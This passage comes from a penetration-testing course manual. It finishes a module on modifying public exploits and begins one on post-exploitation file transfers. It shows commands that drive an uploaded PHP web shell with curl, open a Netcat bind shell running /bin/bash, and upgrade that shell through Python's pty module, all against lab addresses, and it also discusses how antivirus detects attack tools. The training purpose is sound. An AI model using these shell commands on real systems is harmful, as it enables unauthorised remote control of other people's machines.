
variable from `_c` to `_sk_`, this presented a great opportunity to adapt to unexpected situations, something great penetration testers do very well.

Now, we can validate the exploit by attaching to the php shell with a tool like curl and supplying a system command to serve as the payload.

```bash
kali@kali:~$ curl -k https://10.11.0.128/uploads/shell.php?cmd=whoami
www-data
```

> Listing 462 - Verifying if our exploit was successful by trying to execute whoami using the uploaded php shell.

Nice. The exploit was successful. We have a web shell.

## 15.2.4.1 Exercises

- Observe the error that is generated when running the exploit.
- Attempt to troubleshoot the code and determine why the error occurs.
- Modify the exploit in order to avoid the error and run it against your dedicated Linux client.
- Verify that your exploit worked by attempting to execute the whoami command using the remote php shell.
- Attempt to obtain a fully interactive shell with this exploit.

## 15.3 Wrapping Up

In this module, we covered the main segments of a plain stack buffer overflow that required extensive editing to match our target environment. We then cross-compiled the code in order to make it run on our Kali attack platform.

We also modified a web exploit to demonstrate how these types of exploits can be re-purposed for a different target environment.

These scenarios reveal solutions to common obstacles encountered when dealing with public exploits during an engagement.

# 16. File Transfers

The term *post-exploitation* refers to the actions performed by an attacker once they have gained some level of control of a target. Some post-exploitation actions include elevating privileges, expanding control into additional machines, installing backdoors, cleaning up evidence of the attack, uploading files and tools to the target machine, etc.

In this module, we will explore various file transfer methods that can assist us in our assessment when properly used under specific conditions.

## 16.1 Considerations and Preparations

The file transfer methods we discuss in this module could endanger the success of our engagement and should be used with caution and only under specific conditions. We will discuss these conditions in this section.

We will also discuss some basic preparations that will facilitate the exercises and demonstrate and overcome some limitations of standard shells with regards to file transfers.

### 16.1.1 Dangers of Transferring Attack Tools

In some cases, we may need to transfer attack tools and utilities to our target. However, transferring these tools can be dangerous for several reasons.

First, our post-exploitation attack tools could be abused by malicious parties, which puts the client's resources at risk. It is *extremely important* to document uploads and remove them after the assessment is completed.

Second, antivirus software, which scans endpoint filesystems in search of pre-defined file signatures, becomes a huge frustration for us during this phase. This software, which is ubiquitous in most corporate environments, will detect our attack tools, quarantine them (rendering them useless), and alert a system administrator.

If the system administrator is diligent, this will cost us a precious internal remote shell, or in extreme cases, signal the effective end of our engagement. While antivirus evasion is beyond the scope of this module, we discuss this topic in detail in another module.

As a general rule of thumb, we should always try to use native tools on the compromised system. Alternatively, we can upload additional tools when native ones are insufficient, when we have determined that the risk of detection is minimized, or when our need outweighs the risk of detection.

### 16.1.2 Installing Pure-FTPd

In order to accommodate the exercises in this module, let's quickly install the Pure-FTPd server on our Kali attack machine. If you already have an FTP server configured on your Kali system, you may skip these steps.

```bash
kali@kali:~$ sudo apt update && sudo apt install pure-ftpd
```

> Listing 463 - Installing Pure-FTP on Kali

Before any clients can connect to our FTP server, we need to create a new user for Pure-FTPd. The following Bash script will automate the user creation for us:

```bash
kali@kali:~$ cat ./setup-ftp.sh
#!/bin/bash

groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /bin/nologin ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd
```

> Listing 464 - Bash script to setup Pure-FTP on Kali

We will make the script executable, then run it and enter “lab” as the password for the offsec user when prompted:

```bash
kali@kali:~$ chmod +x setup-ftp.sh
kali@kali:~$ sudo ./setup-ftp.sh
Password:
Enter it again:
Restarting ftp server
```

> Listing 465 - Setting up and starting Pure-FTP on Kali

### 16.1.3 The Non-Interactive Shell

Most Netcat-like tools provide a non-interactive shell, which means that programs that require user input such as many file transfer programs or **su** and **sudo** tend to work poorly, if at all. Non-interactive shells also lack useful features like tab completion and job control. An example will help illustrate this problem.

You are hopefully familiar with the **ls** command. This command is *non-interactive*, because it can complete without user interaction.

By contrast, consider a typical FTP login session from our Debian lab client to our Kali system:

```bash
student@debian:~$ ftp 10.11.0.4
Connected to 10.11.0.4.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 09:07. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
Name (10.11.0.4:student): offsec
331 User offsec OK. Password required
Password:
230 OK. Current directory is /
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> bye
221-Goodbye. You uploaded 0 and downloaded 0 bytes.
221 Logout.
student@debian:~$
```

In this session, we enter a username and password, and the process is exited only after we enter the `bye` command. This is an *interactive* program; it requires user intervention to complete.

Although the problem may be obvious at this point, let’s attempt an FTP session through a non-interactive shell, in this case, Netcat.

To begin, let’s assume we have compromised a Debian client and have obtained access to a Netcat bind shell. We’ll launch Netcat on our Debian client listening on port 4444 to simulate this:

```bash
student@debian:~$ nc -lvnf 4444 -e /bin/bash
listening on [any] 4444 ...
```

From our Kali system, we will connect to the listening shell and attempt the FTP session from Listing 466 again:

```bash
kali@kali:~$ nc -vn 10.11.0.128 4444
ftp 10.11.0.4
offsec
lab
bye
^C
kali@kali:~$
```

Behind the scenes, we are interacting with the FTP server, but we are not receiving any feedback in our shell. This is because the standard output from the FTP session (an *interactive* program) is not redirected correctly in a basic bind or reverse shell. This results in the loss of control of our shell and we are forced to exit it completely with `Ctrl+C`. This could prove very problematic during an assessment.

#### 16.1.3.1 Upgrading a Non-Interactive Shell

Now that we understand some of the limitations of non-interactive shells, let’s examine how we can "upgrade" our shell to be far more useful. The Python interpreter, frequently installed on Linux systems, comes with a standard module named `pty` that allows for creation of pseudo-terminals. By using this module, we can spawn a separate process from our remote shell and obtain a fully interactive shell. Let’s try this out.

We will reconnect to our listening Netcat shell, and spawn our `pty` shell:

```bash
kali@kali:~$ nc -vn 10.11.0.128 4444
(UNKNOWN) [10.11.0.128] 4444 ( ?) open
python -c 'import pty; pty.spawn("/bin/bash")'
student@debian:-$
```

Immediately after running our Python command, we are greeted with a familiar Bash prompt. Let’s try connecting to our local FTP server again, this time through the `pty` shell and see how it behaves:
